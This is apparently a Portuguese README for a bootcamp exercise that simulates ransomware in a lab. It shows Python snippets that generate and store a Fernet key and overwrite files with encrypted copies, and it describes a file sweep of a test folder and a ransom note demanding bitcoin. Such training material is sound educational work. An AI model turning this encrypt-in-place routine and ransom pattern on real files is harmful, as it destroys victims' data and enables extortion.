Simulação de Ransomware do bootcampt Dio santander cibersegurança 2025
DISCLAIMER:
Este repositório contém a implementação prática do desafio final do módulo de Python aplicado à Cibersegurança.
Todas as atividades foram realizadas em ambiente controlado e com fins educacionais, simulando o funcionamento básico de um malware:

Ransomware Simulado

Nenhum dos scripts deve ser utilizado fora de ambientes de laboratório.
O objetivo é aprender, analisar e fortalecer defesas, não prejudicar sistemas reais.

1. Geração da chave de criptografia
chave = Fernet.generate_key()


A chave é salva em chave.key.

2. Carregamento da chave
def carregar_chave():
    return open("chave.key", "rb").read()

3. Criptografar arquivos
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

4. Procurar arquivos da vítima

O ransomware simulado percorre uma pasta chamada:

test_files/


e pega tudo que não for o próprio script e nem .key.

5. Criar mensagem de resgate

O script gera um arquivo:

LEIA ISSO.txt


Com conteúdo:

Seus arquivos foram criptografados!
Envie 1 bitcoin para o endereço X...
Depois disso enviaremos a chave...

6. Execução principal

O script:

gera a chave

encontra arquivos

criptografa

gera a mensagem de resgate

finaliza com:

Ransomware executado! Arquivos criptografados!
